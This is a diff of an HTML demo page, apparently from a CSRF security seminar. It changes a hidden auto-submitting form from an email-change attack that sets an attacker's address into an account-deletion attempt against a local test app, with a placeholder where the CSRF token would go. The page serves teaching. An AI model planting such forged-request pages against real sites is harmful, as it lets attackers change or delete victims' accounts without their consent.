@@ -2,18 +2,18 @@
 <html lang="en">
     <head>
         <meta charset="utf-8">
-        <title>CSRF seminar - change email attack</title>
+        <title>CSRF seminar - delete account tentative</title>
     </head>
 
     <body>
         <p><a href="index.html" title="Menu">Back to menu</a><br /></p>
         <p>
-        POST HTTP "invisible" request in <span id="timer">5</span> seconds:</p>
-        <form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=account&action=email">
-            <input type="hidden" name="email" value="mail@attacker.com">
+        POST HTTP "invisible" request in <span id="timer">3</span> seconds:</p>
+        <form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=account&action=delete">
+            <input type="hidden" name="csrf_token" value="how to figure out the token ?">
         </form>
         <script type="text/javascript">
-            var timer = 5; // 5 seconds
+            var timer = 3; // 3 seconds
             var updateId = setInterval(function() {
                 timer--; // remove 1 second
                 document.getElementById("timer").innerHTML = timer; // update HTML
@@ -21,15 +21,15 @@
             setTimeout(function() {
                 clearInterval(updateId); // remove HTML update
                 document.hackForm.submit(); // submit form
-            }, 5000);
+            }, 3000);
         </script>
         <br />
         <br />
         <hr />
         Code:<br />
         <code>
-        &lt;form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=account&amp;action=email"&gt;<br />
-            &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" <span style="color:red;">name="email" value="mail@attacker.com"</span>&gt;<br />
+        &lt;form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=account&amp;action=delete"&gt;<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" <span style="color:red;">name="csrf_token" value="how to figure out the token ?"</span>&gt;<br />
         &lt;/form&gt;<br />
         &lt;script type="text/javascript"&gt;document.hackForm.submit();&lt;/script&gt;<br />
         </code>
